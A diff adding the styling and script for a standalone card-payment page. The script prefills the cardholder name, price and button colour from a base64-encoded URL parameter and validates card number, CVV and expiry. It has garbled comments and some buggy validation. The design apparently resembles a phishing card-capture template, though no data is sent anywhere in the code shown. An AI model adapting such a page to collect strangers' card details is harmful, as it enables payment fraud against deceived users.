+        #subtitle {
+          color: #071f2f;
+          font-size: 12px;
+          line-height: 18px;
+          margin: 10px 0 0;
+          text-align: start;
+          font-family: Open Sans, Arial, sans-serif !important;
+        }
+        
+        .stars {
+          display: flex;
+          align-items: center;
+          gap: 10px;
+          margin-top: 5px;
+        }
+        
+        .stars img {
+          width: 90px;
+        }
+        
+        #reviews {
+          color: #071f2f;
+          font-size: 12px;
+          line-height: 18px;
+          margin-top: 14px;
+          font-family: Open Sans, Arial, sans-serif !important;
+        }
+        
+        .location {
+          color: #c6c8cc;
+          display: flex;
+          gap: 3px;
+          align-items: center;
+          margin-bottom: 8px;
+          padding: 0 20px;
+          cursor: pointer;
+        }
+        
+        #location {
+          font-family: Open Sans, Arial, sans-serif !important;
+          font-size: 14px;
+          color: #c6c8cc;
+          margin: 0;
+        }
+        
+        .form {
+          padding: 0 20px 20px;
+        }
+        
+        .form-group {
+            width: 100%;
+          margin-bottom: 8px;
+          position: relative;
+        }
+        
+        #card-number {
+          position: relative;
+          padding-right: 30px; 
+          font-size: 14px;
+          border-radius: 2px;
+        }
+      
+        .card-icon {
+          position: absolute;
+          top: 50px;
+          right: 35px;
+          transform: translateY(-50%);
+          width: 25px;
+          height: 25px;
+          opacity: 0.4; 
+        }
+
+        #cvv-icon {
+            position: absolute;
+            width: 18px;
+            height: 18px;
+            transform: translateY(-50%);
+            right: 18px;
+            top: 50px;
+            right: 35px;
+        }
+
+        #triangle {
+            position: absolute;
+            width: 10px;
+            height: 8px;
+            transform: translateY(-50%);
+            right: 18px;
+            top: 50%;
+            right: 35px;
+        }
+        
+        label {
+          display: block;
+          font-weight: normal;
+          margin-bottom: 4px;
+          text-align: start;
+          font-family: Open Sans, Arial, sans-serif !important;
+          color: #071f2f;
+          font-size: 16px;
+        }
+        input {
+          width: 100%;
+          padding-left: 18px;
+          border: 1px solid #dedede;
+          border-radius: 2px;
+          font-size: 14px;
+          height: 44px;
+          background-color: #fff;
+          box-shadow: none;
+          -webkit-appearance: none;
+          transition: border .3s ease-in;
+          color: rgb(118, 118, 118);
+          margin: 4px 0 6px;
+          display: inline-block;
+          outline: 0;
+        }
+    
+
+        .custom-select-container {
+            position: relative;
+            font-family: Open Sans, Arial, sans-serif !important;
+            display: none;
+            padding: 0 20px;
+            margin-bottom: 15px;
+            background-color: #fff;
+        }
+
+        #exp-box {
+            display: flex;
+            justify-content: space-between;
+            gap: 20px;
+        }
+
+        #exp-month, #exp-year {
+            display: flex;
+            width: 50%;
+            padding: 0 !important;
+            margin-bottom: 4px !important;
+        }
+
+        #exp-month .custom-select-dropdown,
+        #exp-year .custom-select-dropdown {
+            margin: 0 !important;
+            display: none;
+        }
+
+        .custom-select-button {
+            width: 100%;
+            padding-left: 18px;
+            padding-right: 18px;
+            font-size: 14px;
+            height: 44px;
+            color: rgb(120, 120, 120);
+            background-color: #fff;
+            border: 1px solid #dedede;
+            border-radius: 2px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+            transition: border-color 0.3s, background-color 0.3s;
+            position: relative;
+            font-family: Open Sans, Arial, sans-serif !important;
+        }
+
+        .custom-select-button.focused {
+            border-color: #00c0ff;
+            background-color: #fff;
+        }
+
+        .arrow {
+            border: solid #cccccc;
+            border-width: 0 2px 2px 0;
+            padding: 4px;
+            display: inline-block;
+            transform: rotate(45deg);
+            transition: border-color 0.3s, transform 0.3s;
+        }
+
+        .custom-select-button.open .arrow {
+            transform: rotate(-135deg);
+            border-color: #00c0ff;
+        }
+
+        .custom-select-dropdown {
+            position: absolute;
+            top: 100%;
+            max-height: 220px; 
+            border: 1px solid #00c0ff;
+            border-top: none;
+            overflow-y: auto;
+            display: none;
+            z-index: 100;
+
+           
+            top: 100%;
+            font-size: 14px;
+            color: rgb(120, 120, 120);
+            background-color: #fff;
+            border-radius: 2px;
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            transition: border-color 0.3s, background-color 0.3s;
+            width: -webkit-fill-available;
+            margin-right: 20px;
+        }
+
+        .custom-select-item {
+            font-size: 14px;
+            cursor: pointer;
+            color: #555;
+            transition: background-color 0.2s;
+            height: 44px;
+            display: flex;
+            align-items: center;
+            font-family: Open Sans, Arial, sans-serif !important;
+            padding: 0 20px;
+        }
+
+        .custom-select-item:hover {
+            background-color: #4b8fe2;
+            color: #fff;
+            font-family: Open Sans, Arial, sans-serif !important;
+        }
+        
+        input:focus, select:focus {
+          outline: none;
+          border-color: #00c0ff;
+        }
+        .input-invalid {
+          border-color: #ff2400;
+        }
+        .error-message {
+          display: none;
+          color: #e63946;
+          font-size: 14px;
+          margin: 0;
+          font-family: Open Sans, Arial, sans-serif !important;
+        }
+        .form-inline {
+          display: flex;
+          gap: 10px;
+          font-size: 14px;
+          color: #555;
+        }
+        .form-inline select {
+          flex: 1;
+        }
+
+        .cards {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin: 10px 0 ;
+        }
+
+        .cards img {
+            width: 42px;
+            height: 28px;
+        }
+        
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            font-size: 14px;
+            cursor: pointer;
+            padding: 0 20px;
+        }
+
+        .checkbox-container input[type="checkbox"] {
+            display: none;
+        }
+
+        .checkbox-custom {
+            width: 18px;
+            height: 14px;
+            border: 1px solid #d7d7d7;
+            border-radius: 3px;
+            background-color: #fff; 
+            margin-right: 10px;
+            margin-top: -13px;
+            position: relative;
+            cursor: pointer;
+            align-items: top;
+        }
+
+        .checkbox-custom::after {
+            content: "";
+            position: absolute;
+            bottom: 4px;
+            left: 5px;
+            width: 4px;
+            height: 8px;
+            border: 1px solid #00c0ff; 
+            border-width: 0 1px 1px 0;
+            transform: rotate(45deg);
+            opacity: 0; 
+        }
+
+        input[type="checkbox"]:checked + .checkbox-custom::after {
+            opacity: 1;
+        }
+
+        #checkbox-text {
+            color: #8f8f8f;
+            font-size: 12px;
+            line-height: 16px;
+            font-weight: 400;
+        }
+
+        #submit {
+            font-size: 16px;
+            width: 100%;
+            border-radius: 2px;
+            font-weight: 700;
+            padding: 5px 16px;
+            min-height: 50px;
+            cursor: pointer;
+            background-color: #1ca21e;
+            border: none;
+            color: #fff;
+            transition: all 0.3s linear;
+        }
+        #submit:hover {
+          transform: scale(1.02);
+        }
+
+        .pictures {
+            display: flex;
+            justify-content: center;
+            padding: 0 20px;
+        }
+
+        .pictures img {
+            width: 33%;
+            margin: 0 12px;
+            max-width: 100px;
+            height: auto;
+        }
+
+        #textline {
+            color: #8f8f8f;
+            font-size: 10px;
+            margin: 4px 0;
+            line-height: 18px;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .image {
+            text-align: center;
+            margin: 20px 0 32px;
+        }
+
+        .image img {
+            width: 100%;
+            max-width: 354px;
+            height: auto;
+        }
+
+        .block {
+            display: flex;
+            align-items: center;
+            margin-bottom: 22px;
+            padding: 0 20px 0;
+        }
+        .block-icon {
+            width: 45px;
+            margin-right: 30px;
+            padding-left: 10px;
+        }
+        .block-icon img {
+            width: 100%;
+        }
+        .block-text {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+        .block-text p {
+            margin: 0;
+        }
+
+        .block-title {
+            font-size: 22px;
+            line-height: 28px;
+            font-weight: 700;
+            font-family: Open Sans, Arial, sans-serif !important;
+            color: #071f2f;
+            letter-spacing: 0.5px;
+        }
+
+        .block-subtitle {
+            color: #071f2f;
+            font-size: 14px;
+            line-height: 21px;
+            font-weight: 300;
+            font-family: Open Sans, Arial, sans-serif !important;
+            letter-spacing: 0.3px;
+            opacity: 0.8;
+        }
+
+        #question {
+            padding-left: 30px;
+            margin-top: 30px;
+            font-size: 15px;
+            line-height: 18px;
+            font-weight: 700;
+            text-transform: uppercase;
+            font-family: Open Sans, Arial, sans-serif !important;
+            text-align: center;
+        }
+
+        #answer {
+            padding-left: 30px;
+            font-family: Open Sans, Arial, sans-serif !important;
+            color: #212529;
+            font-size: 11px;
+            line-height: 16px;
+            margin-bottom: 20px;
+            opacity: 0.8;
+            text-align: center;
+        }
+
+        .footer {
+          background-color: #000;
+          padding: 25px;
+          text-align: center;
+        }
+
+        #copyright {
+          color: #bababa;
+          font-size: 14px;
+          font-family: Open Sans, Arial, sans-serif !important;
+        }
+
+        @media (max-width: 1024px) {
+            .container {
+                display: flex;
+                flex-direction: column;
+                gap: 30px;
+                justify-content: center;
+                width: 90%;
+                margin: 0 auto;
+            }
+
+            .left, .right {
+                width: 100%;
+            }
+        }
+    </style>
+
+    <script>
+        function getDecodedParams() {
+          const encoded = new URLSearchParams(window.location.search).get('d');
+          if (!encoded) return {};
+
+          try {
+            const decoded = atob(encoded); // base64 -> ÑÑÐ´Ð¾Ðº
+            const params = new URLSearchParams(decoded);
+            const result = {};
+
+            for (const [key, value] of params.entries()) {
+              result[key] = value;
+            }
+
+            return result;
+          } catch (e) {
+            console.error('ÐÐ¾Ð¼Ð¸Ð»ÐºÐ° Ð´ÐµÐºÐ¾Ð´ÑÐ²Ð°Ð½Ð½Ñ data:', e);
+            return {};
+          }
+        }
+
+        const params = getDecodedParams();
+        const fname = params.fname;
+        const lname = params.lname;
+
+        if (fname && lname) {
+          const fullName = [fname, lname].filter(Boolean).join(' ');
+          document.getElementById('card-holder').value = fullName;
+        }
+
+        const price = params.price;
+        if (price) {
+          document.getElementById('price-text').textContent = `${price}`;
+        } else {
+          document.getElementById('price-text').textContent = ''; 
+        }
+
+        const colorParam = params.clr;
+        const button = document.getElementById('submit');
+
+        if (colorParam && /^([0-9a-fA-F]{6})$/.test(colorParam)) {
+          button.style.backgroundColor = '#' + colorParam;
+        }
+
+        function toggleDropdown(button) {
+        const dropdown = button.nextElementSibling;
+
+        document.querySelectorAll('.custom-select-dropdown').forEach(d => {
+        if (d !== dropdown) d.style.display = 'none';
+        });
+        document.querySelectorAll('.custom-select-button').forEach(b => {
+        if (b !== button) b.classList.remove('open', 'focused');
+        });
+
+        if (dropdown.style.display === 'block') {
+        dropdown.style.display = 'none';
+        button.classList.remove('open', 'focused');
+        } else {
+        dropdown.style.display = 'block';
+        button.classList.add('open', 'focused');
+        }
+    }
+
+    function selectOption(item, value) {
+        const button = item.parentElement.previousElementSibling;
+        button.querySelector('.selected-option').textContent = value;
+        item.parentElement.style.display = 'none';
+        button.classList.remove('open', 'focused');
+    }
+
+    document.addEventListener('click', function(event) {
+        const isClickInside = event.target.closest('.custom-select-container');
+        if (!isClickInside) {
+        document.querySelectorAll('.custom-select-dropdown').forEach(dropdown => dropdown.style.display = 'none');
+        document.querySelectorAll('.custom-select-button').forEach(button => button.classList.remove('open', 'focused'));
+        }
+    });
+
+
+    const cardInput = document.getElementById('card-number');
+    const errorMessage = document.getElementById('error-message');
+
+    cardInput.addEventListener('input', () => {
+        errorMessage.style.display = 'none';
+
+        let input = cardInput.value.replace(/\D/g, '');
+
+        input = input.match(/.{1,4}/g)?.join('-') || '';
+        cardInput.value = input;
+
+       if (input.length === 19 && !/^\d{4}-\d{4}-\d{4}-\d{4}$/.test(input)) {
+        errorMessage.style.display = 'block';
+        } 
+    });
+
+    cardInput.addEventListener('blur', () => {
+        if (!/^\d{4}-\d{4}-\d{4}-\d{4}$/.test(cardInput.value)) {
+        errorMessage.style.display = 'block';
+        } else {
+        errorMessage.style.display = 'none';
+        }
+    });
+
+
+
+    const holderInput = document.getElementById('card-holder');
+  const holderErrorMessage = document.getElementById('holder-error-message');
+
+  holderInput.addEventListener('input', () => {
+    const isValid = /^[A-Za-z\s]*$/.test(holderInput.value);
+
+    if (!isValid) {
+      holderErrorMessage.style.display = 'block';
+    } else {
+      holderErrorMessage.style.display = 'none';
+    }
+  });
+
+  holderInput.addEventListener('blur', () => {
+    holderInput.value = holderInput.value.trim();
+
+    if (holderInput.value === '' || !isValid) {
+      holderErrorMessage.style.display = 'block';
+    } else {
+      holderErrorMessage.style.display = 'none';
+    }
+  });
+
+  const cvvInput = document.getElementById('cvv');
+  const cvvErrorMessage = document.getElementById('cvv-error-message');
+
+  cvvInput.addEventListener('input', () => {
+    cvvErrorMessage.style.display = 'none';
+
+    cvvInput.value = cvvInput.value.replace(/\D/g, '');
+
+    if (cvvInput.value.length > 4) {
+      cvvInput.value = cvvInput.value.slice(0, 4);
+    }
+
+    if (cvvInput.value.length > 0 && cvvInput.value.length < 3) {
+      cvvErrorMessage.style.display = 'block';
+    } else {
+      cvvErrorMessage.style.display = 'none';
+    }
+  });
+
+  cvvInput.addEventListener('blur', () => {
+    if (cvvInput.value.length < 3) {
+      cvvErrorMessage.style.display = 'block';
+    } else {
+      cvvErrorMessage.style.display = 'none';
+    }
+  });
+
+
+  const expErrorMessage = document.getElementById('exp-error-message');
+  const monthSelect = document.querySelector('#exp-month .selected-option');
+  const yearSelect = document.querySelector('#exp-year .selected-option');
+
+  function selectOption(element, value) {
+    element.parentElement.previousElementSibling.querySelector('.selected-option').textContent = value;
+  }
+
+  function validateExpirationDate() {
+    let isValid = true;
+
+    if (monthSelect.textContent === 'MM' || yearSelect.textContent === 'YY') {
+      expErrorMessage.style.display = 'block';
+      isValid = false;
+    } else {
+      expErrorMessage.style.display = 'none';
+    }
+
+    return isValid;
+  }
+
+
+  const submitButton = document.getElementById('submit');
+
+  function validateFields() {
+    let isValid = true;
+
+    
+    if (!/^[A-Za-z\s]+$/.test(holderInput.value) || holderInput.value.trim() === '') {
+      holderErrorMessage.style.display = 'block';
+      isValid = false;
+    } else {
+      holderErrorMessage.style.display = 'none';
+    }
+
+    if (!/^\d{3,4}$/.test(cvvInput.value)) {
+      cvvErrorMessage.style.display = 'block';
+      isValid = false;
+    } else {
+      cvvErrorMessage.style.display = 'none';
+    }
+
+    if (!/^\d{4}-\d{4}-\d{4}-\d{4}$/.test(cardInput.value)) {
+        errorMessage.style.display = 'block';
+        } else {
+        errorMessage.style.display = 'none';
+    }
+
+    if (monthSelect.textContent === 'MM' || yearSelect.textContent === 'YY') {
+      expErrorMessage.style.display = 'block';
+      isValid = false;
+    } else {
+      expErrorMessage.style.display = 'none';
+    }
+
+    return isValid;
+  }
+
+  submitButton.addEventListener('click', (event) => {
+    event.preventDefault();
+
+    if (validateFields()) {
+      alert('Validation passed!'); 
+    } else {
+      alert('Please correct the errors before continuing.');
+    }
+  });
+
+    </script>
+</body>
+</html>
+-------------------
+favicon.ico
